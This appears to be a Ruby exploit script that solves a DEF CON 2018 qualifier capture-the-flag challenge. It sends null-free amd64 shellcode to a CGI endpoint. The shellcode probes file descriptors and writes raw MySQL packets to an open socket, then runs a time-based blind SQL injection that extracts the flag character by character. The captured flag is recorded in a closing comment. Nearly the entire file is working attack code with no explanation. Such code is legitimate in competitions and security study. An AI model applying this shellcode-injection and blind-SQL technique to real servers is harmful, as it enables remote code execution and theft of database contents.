#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget
require 'net/http'

# @magic = one_gadget(file: './libc.so.6')[0]

@host, port = 'http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php', 31337
#================= Exploit Start ====================
def post(data)
  uri = URI(@host)
  res = Net::HTTP.post_form(uri, {shell: data})
  # puts res.body
end
context.arch = :amd64

def scan_fd
  0.upto(4) do |fd|
    p fd
    shellcode =
      asm(shellcraft.syscall('SYS_write', fd, 'rsp', 1)) +
      asm(<<EOS)
  cmp rax, 1
  je ret
loop:
  jmp loop
ret:
  ret
EOS
    fail if shellcode.bytes.include?(0)
    p shellcode
    post(shellcode)
  end
end

def send_sql(data)
  fd = 4
  shellcode = asm(shellcraft.pushstr(data)) +
    asm(shellcraft.syscall('SYS_write', fd, 'rsp', data.size)) +
    asm(shellcraft.syscall('SYS_read', fd, 'rsp', 1)) +
    asm('ret')
  # p shellcode
  fail if shellcode.bytes.include?(0)
  post(shellcode)
end

# send_sql("0b0000000373656c65637420313233".unhex)
# length 70
len = 70
# len = 1
def search(l)
  can = "abcdefghijklmnopqrstuvwxyz {}ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"\#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
  can.chars.each do |c|
    sql = "select if((select ascii(mid(flag, #{l+1}, 1)) from flag) = #{c.ord}, sleep(3), 0)"
    t = Time.now
    send_sql(p32(sql.size+1)+"\x03" +sql)
    return c if Time.now - t > 2
  end
  fail
end
st = ARGV[0].to_i
p "start from #{st}"
flag = []
(st..(len-1)).each do |l|
  flag << search(l)
  p flag.join
end

# OOO{shellcode and webshell is old news, get with the times my friend!}
